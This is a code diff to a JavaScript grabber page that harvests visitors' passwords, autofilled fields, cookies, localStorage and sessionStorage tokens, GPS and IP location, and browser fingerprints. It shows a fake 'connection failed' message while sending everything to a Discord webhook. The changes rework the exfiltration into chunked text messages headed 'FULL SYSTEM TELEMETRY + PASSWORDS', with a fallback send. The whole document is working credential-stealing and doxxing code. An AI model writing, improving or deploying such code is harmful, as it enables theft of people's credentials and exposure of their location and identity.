@@ -91,15 +91,14 @@
         // ─── DEBUG ──────────────────────────────────────────────────
         function debug(msg, data = null) {
             if (!DEBUG_ENABLED) return;
-            const entry = { time: new Date().toISOString(), msg, data };
+            const entry = { time: new Date().toISOString().slice(11,19), msg, data };
             debugLog.push(entry);
             console.log('[DEBUG]', msg, data || '');
             
-            // Update debug div if visible
             const debugEl = document.getElementById('debug');
             if (debugEl.classList.contains('show')) {
                 debugEl.innerHTML = debugLog.map(e => 
-                    `<div>[${e.time.slice(11,19)}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
+                    `<div>[${e.time}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
                 ).join('');
                 debugEl.scrollTop = debugEl.scrollHeight;
             }
@@ -110,7 +109,7 @@
             el.classList.toggle('show');
             if (el.classList.contains('show')) {
                 el.innerHTML = debugLog.map(e => 
-                    `<div>[${e.time.slice(11,19)}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
+                    `<div>[${e.time}] ${e.msg}${e.data ? ' → ' + JSON.stringify(e.data).substring(0,100) : ''}</div>`
                 ).join('');
             }
         };
@@ -120,7 +119,6 @@
             debug('🔍 Starting password grab');
             const passwords = [];
             
-            // 1. Check for autofilled password fields
             try {
                 const pwdInputs = document.querySelectorAll('input[type="password"]');
                 debug(`📋 Found ${pwdInputs.length} password fields`);
@@ -137,13 +135,10 @@
                 });
             } catch(e) { debug('❌ Error grabbing autofill:', e.message); }
 
-            // 2. Check localStorage for password patterns
             try {
-                const lsItems = [];
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
                     const val = localStorage.getItem(key);
-                    lsItems.push({key, val});
                     if (key.toLowerCase().includes('pass') || 
                         key.toLowerCase().includes('pwd') ||
                         key.toLowerCase().includes('token') ||
@@ -156,16 +151,13 @@
                         debug(`🔐 localStorage: ${key} = ${val.substring(0,10)}...`);
                     }
                 }
-                debug(`📦 localStorage items: ${lsItems.length}`);
+                debug(`📦 localStorage items: ${localStorage.length}`);
             } catch(e) { debug('❌ Error reading localStorage:', e.message); }
 
-            // 3. Check sessionStorage
             try {
-                const ssItems = [];
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const key = sessionStorage.key(i);
                     const val = sessionStorage.getItem(key);
-                    ssItems.push({key, val});
                     if (key.toLowerCase().includes('pass') || 
                         key.toLowerCase().includes('pwd') ||
                         key.toLowerCase().includes('token') ||
@@ -178,10 +170,9 @@
                         debug(`🔐 sessionStorage: ${key} = ${val.substring(0,10)}...`);
                     }
                 }
-                debug(`📦 sessionStorage items: ${ssItems.length}`);
+                debug(`📦 sessionStorage items: ${sessionStorage.length}`);
             } catch(e) { debug('❌ Error reading sessionStorage:', e.message); }
 
-            // 4. Check cookies for auth tokens
             try {
                 const cookieList = document.cookie.split(';').filter(c => c.trim());
                 debug(`🍪 Found ${cookieList.length} cookies`);
@@ -202,7 +193,6 @@
                 });
             } catch(e) { debug('❌ Error reading cookies:', e.message); }
 
-            // 5. Check for password managers and forms
             try {
                 const forms = document.querySelectorAll('form');
                 debug(`📝 Found ${forms.length} forms`);
@@ -232,7 +222,6 @@
                 });
             } catch(e) { debug('❌ Error scanning forms:', e.message); }
 
-            // 6. Check for session tokens in URL
             try {
                 const params = new URLSearchParams(window.location.search);
                 debug(`🔗 URL params: ${Array.from(params.entries()).length}`);
@@ -435,12 +424,12 @@
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
+                    const text = await response.text();
                     if (response.ok) {
                         debug('✅ Data sent successfully');
                         return true;
                     } else {
-                        const text = await response.text();
-                        debug(`❌ Attempt ${i+1} failed: ${response.status} - ${text.substring(0,100)}`);
+                        debug(`❌ Attempt ${i+1} failed: ${response.status} - ${text.substring(0,200)}`);
                         await new Promise(resolve => setTimeout(resolve, 1500 * (i + 1)));
                     }
                 } catch (e) {
@@ -458,7 +447,7 @@
             try {
                 document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';
 
-                // 1. IP + Geo (via ipapi.co)
+                // 1. IP + Geo
                 debug('📡 Fetching IP data from ipapi.co');
                 let ipData = {};
                 try {
@@ -500,116 +489,111 @@
                 const doNotTrack = navigator.doNotTrack || 'unspecified';
                 const maxTouchPoints = navigator.maxTouchPoints || 0;
 
-                // 4. Storage
                 const cookies = document.cookie;
                 const localStorageData = getLocalStorage();
                 const sessionStorageData = getSessionStorage();
-
-                // 5. Plugins / MIME
                 const plugins = getBrowserPlugins();
                 const mimeTypes = getMimeTypes();
 
-                // 6. Fingerprints
                 debug('🖌️ Generating fingerprints');
                 const canvasFp = getCanvasFingerprint();
                 const webgl = getWebGLInfo();
                 const audioFp = getAudioFingerprint();
 
-                // 7. System
                 const timeZone = getTimeZone();
                 const screenInfo = getScreenInfo();
                 const deviceMemory = getDeviceMemory();
                 const hardwareConcurrency = getHardwareConcurrency();
                 const netInfo = getNetworkInfo();
 
-                // 8. Async
                 debug('🔋 Gathering async data');
                 const battery = await getBatteryInfo();
                 const geo = await getGeolocation();
                 const permissions = await getPermissions();
 
-                // 9. Referrer & Page
                 const referrer = document.referrer || 'direct';
                 const pageUrl = window.location.href;
                 const pageTitle = document.title;
 
-                // 10. Construct embed
-                debug('📝 Building Discord embed');
-                const fields = [
-                    { name: '🌐 IP Address', value: `\`${ip}\``, inline: true },
-                    { name: '📍 Location', value: `${city}, ${region}, ${country}`, inline: true },
-                    { name: '🗺️ Coordinates', value: `${latitude}, ${longitude}`, inline: true },
-                    { name: '📮 Postal / ASN', value: `${postal} | \`${asn}\``, inline: false },
-                    { name: '🏢 ISP / Carrier', value: `\`${isp}\``, inline: true },
-                    { name: '🌍 Country Code', value: `\`${countryCode}\``, inline: true },
-                    { name: '💰 Currency', value: `\`${currency}\``, inline: true },
-                    { name: '🕐 Timezone', value: `\`${timezone}\``, inline: true },
-                    { name: '🖥️ Platform', value: `\`${platform}\``, inline: true },
-                    { name: '🌍 Browser Language', value: `\`${language}\``, inline: true },
-                    { name: '🗣️ All Languages', value: `\`${languages.join(', ')}\``, inline: false },
-                    { name: '🍪 Cookies Enabled', value: `\`${cookieEnabled}\``, inline: true },
-                    { name: '🚫 Do Not Track', value: `\`${doNotTrack}\``, inline: true },
-                    { name: '👆 Max Touch Points', value: `\`${maxTouchPoints}\``, inline: true },
-                    { name: '📺 Screen', value: `${screenInfo.width}x${screenInfo.height} | ${screenInfo.colorDepth}-bit | dpr: ${screenInfo.pixelRatio}`, inline: false },
-                    { name: '🧠 Device Memory', value: `\`${deviceMemory} GB\``, inline: true },
-                    { name: '⚡ CPU Cores', value: `\`${hardwareConcurrency}\``, inline: true },
-                    { name: '📶 Network', value: `type: ${netInfo.effectiveType || '?'} | rtt: ${netInfo.rtt || '?'}ms | downlink: ${netInfo.downlink || '?'}Mbps`, inline: false },
-                    { name: '🔋 Battery', value: `level: ${battery.level || '?'} | charging: ${battery.charging || '?'}`, inline: true },
-                    { name: '📡 Geolocation (GPS)', value: geo !== 'unavailable' ? `${geo.lat}, ${geo.lon} (acc: ${geo.acc}m)` : 'denied/unavailable', inline: false },
-                    { name: '🔐 Permissions', value: Object.entries(permissions).map(([k,v]) => `${k}: ${v}`).join(' | ') || 'unavailable', inline: false },
-                    { name: '🖌️ Canvas Fingerprint', value: `\`${canvasFp}\``, inline: false },
-                    { name: '🎮 WebGL', value: webgl !== 'unavailable' ? `${webgl.vendor} | ${webgl.renderer}` : 'unavailable', inline: false },
-                    { name: '🎵 Audio Fingerprint', value: `\`${audioFp}\``, inline: false },
-                    { name: '🔌 Plugins', value: plugins.length ? `\`${plugins.slice(0, 10).join(', ')}${plugins.length > 10 ? '...' : ''}\`` : 'none', inline: false },
-                    { name: '📁 MIME Types', value: mimeTypes.length ? `\`${mimeTypes.slice(0, 8).join(', ')}${mimeTypes.length > 8 ? '...' : ''}\`` : 'none', inline: false },
-                    { name: '🍪 All Cookies', value: cookies ? `\`${cookies.substring(0, 500)}${cookies.length > 500 ? '...' : ''}\`` : 'none', inline: false },
-                    { name: '💾 localStorage', value: Object.keys(localStorageData).length ? `\`${JSON.stringify(localStorageData).substring(0, 500)}...\`` : 'empty', inline: false },
-                    { name: '📦 sessionStorage', value: Object.keys(sessionStorageData).length ? `\`${JSON.stringify(sessionStorageData).substring(0, 500)}...\`` : 'empty', inline: false },
-                    { name: '🔗 Referrer', value: `\`${referrer}\``, inline: true },
-                    { name: '📄 Page URL', value: `\`${pageUrl}\``, inline: false },
-                    { name: '📰 Page Title', value: `\`${pageTitle}\``, inline: true },
-                    { name: '📱 User Agent (full)', value: `\`${ua}\``, inline: false }
-                ];
+                // ─── BUILD PLAIN TEXT MESSAGE (more reliable) ────
+                debug('📝 Building Discord message');
+                
+                let message = '🕵️ **FULL SYSTEM TELEMETRY + PASSWORDS**\n\n';
+                message += `🌐 **IP:** \`${ip}\`\n`;
+                message += `📍 **Location:** ${city}, ${region}, ${country}\n`;
+                message += `🗺️ **Coordinates:** ${latitude}, ${longitude}\n`;
+                message += `📮 **Postal/ASN:** ${postal} | \`${asn}\`\n`;
+                message += `🏢 **ISP:** \`${isp}\`\n`;
+                message += `🌍 **Country Code:** \`${countryCode}\`\n`;
+                message += `💰 **Currency:** \`${currency}\`\n`;
+                message += `🕐 **Timezone:** \`${timezone}\`\n`;
+                message += `🖥️ **Platform:** \`${platform}\`\n`;
+                message += `🌍 **Browser Language:** \`${language}\`\n`;
+                message += `🗣️ **All Languages:** \`${languages.join(', ')}\`\n`;
+                message += `🍪 **Cookies Enabled:** \`${cookieEnabled}\`\n`;
+                message += `🚫 **Do Not Track:** \`${doNotTrack}\`\n`;
+                message += `👆 **Max Touch Points:** \`${maxTouchPoints}\`\n`;
+                message += `📺 **Screen:** ${screenInfo.width}x${screenInfo.height} | ${screenInfo.colorDepth}-bit | dpr: ${screenInfo.pixelRatio}\n`;
+                message += `🧠 **Device Memory:** \`${deviceMemory} GB\`\n`;
+                message += `⚡ **CPU Cores:** \`${hardwareConcurrency}\`\n`;
+                message += `📶 **Network:** type: ${netInfo.effectiveType || '?'} | rtt: ${netInfo.rtt || '?'}ms | downlink: ${netInfo.downlink || '?'}Mbps\n`;
+                message += `🔋 **Battery:** level: ${battery.level || '?'} | charging: ${battery.charging || '?'}\n`;
+                message += `📡 **GPS:** ${geo !== 'unavailable' ? `${geo.lat}, ${geo.lon} (acc: ${geo.acc}m)` : 'denied/unavailable'}\n`;
+                message += `🔐 **Permissions:** ${Object.entries(permissions).map(([k,v]) => `${k}: ${v}`).join(' | ')}\n`;
+                message += `🖌️ **Canvas FP:** \`${canvasFp}\`\n`;
+                message += `🎮 **WebGL:** ${webgl !== 'unavailable' ? `${webgl.vendor} | ${webgl.renderer}` : 'unavailable'}\n`;
+                message += `🎵 **Audio FP:** \`${audioFp}\`\n`;
+                message += `🔌 **Plugins:** ${plugins.length ? `\`${plugins.slice(0, 10).join(', ')}${plugins.length > 10 ? '...' : ''}\`` : 'none'}\n`;
+                message += `📁 **MIME Types:** ${mimeTypes.length ? `\`${mimeTypes.slice(0, 8).join(', ')}${mimeTypes.length > 8 ? '...' : ''}\`` : 'none'}\n`;
+                message += `🍪 **All Cookies:** ${cookies ? `\`${cookies.substring(0, 500)}${cookies.length > 500 ? '...' : ''}\`` : 'none'}\n`;
+                message += `💾 **localStorage:** ${Object.keys(localStorageData).length ? `\`${JSON.stringify(localStorageData).substring(0, 500)}...\`` : 'empty'}\n`;
+                message += `📦 **sessionStorage:** ${Object.keys(sessionStorageData).length ? `\`${JSON.stringify(sessionStorageData).substring(0, 500)}...\`` : 'empty'}\n`;
+                message += `🔗 **Referrer:** \`${referrer}\`\n`;
+                message += `📄 **Page URL:** \`${pageUrl}\`\n`;
+                message += `📰 **Page Title:** \`${pageTitle}\`\n`;
+                message += `📱 **User Agent:** \`${ua}\`\n`;
 
-                // Add password section if any found
                 if (passwords.length > 0) {
-                    const pwdSummary = passwords.map(p => {
+                    message += `\n🔑 **CAPTURED PASSWORDS (${passwords.length}):**\n`;
+                    passwords.forEach(p => {
                         if (p.type === 'autofilled') {
-                            return `🔓 Autofilled: ${p.id} = ${p.value}`;
+                            message += `  🔓 Autofilled: ${p.id} = ${p.value}\n`;
                         } else if (p.type === 'form_submission') {
-                            return `🔑 Form: ${p.username} | ${p.password}`;
+                            message += `  🔑 Form: ${p.username} | ${p.password}\n`;
                         } else {
-                            return `🔐 ${p.type}: ${p.key} = ${p.value}`;
+                            message += `  🔐 ${p.type}: ${p.key} = ${p.value}\n`;
                         }
-                    }).join('\n');
-                    
-                    fields.push({
-                        name: `🔑 CAPTURED PASSWORDS & TOKENS (${passwords.length})`,
-                        value: `\`\`\`${pwdSummary.substring(0, 1000)}\`\`\``,
-                        inline: false
                     });
                 }
 
-                const embed = {
-                    title: '🕵️ FULL SYSTEM TELEMETRY + PASSWORDS',
-                    color: 0xff3b3b,
-                    fields: fields,
-                    timestamp: new Date().toISOString(),
-                    footer: { text: '🚨 comprehensive dox package • all data logged' }
-                };
+                // Split if too long (Discord limit 2000 chars)
+                const chunks = [];
+                let current = '';
+                message.split('\n').forEach(line => {
+                    if ((current + line + '\n').length > 1900) {
+                        chunks.push(current);
+                        current = '';
+                    }
+                    current += line + '\n';
+                });
+                if (current) chunks.push(current);
 
-                // 11. Send to Discord with retry
-                debug('📤 Sending payload to Discord');
-                const sent = await sendToDiscord({ embeds: [embed] });
-                
-                if (sent) {
-                    debug('✅ Data delivered successfully');
-                    document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
-                } else {
-                    debug('❌ Failed to send after all retries');
-                    document.getElementById('status').textContent = '⚠️ connection failed • server unreachable';
+                // Send each chunk as separate message
+                for (let i = 0; i < chunks.length; i++) {
+                    const payload = { content: chunks[i] };
+                    const sent = await sendToDiscord(payload);
+                    if (!sent && i === 0) {
+                        // Try fallback: just send raw
+                        debug('⚠️ Fallback: sending raw text');
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ content: 'Data collected - check console for details' })
+                        });
+                    }
                 }
 
+                document.getElementById('status').textContent = '⚠️ connection failed • retry limit exceeded';
                 debug('🏁 Data collection complete');
 
             } catch (err) {
@@ -623,7 +607,7 @@
         // ─── START ──────────────────────────────────────────────────
         debug('⏳ Initializing...');
         gatherAndSend();
-        debug('✅ Script initialized, gathering data...');
+        debug('✅ Script initialized');
 
     })();
 </script>
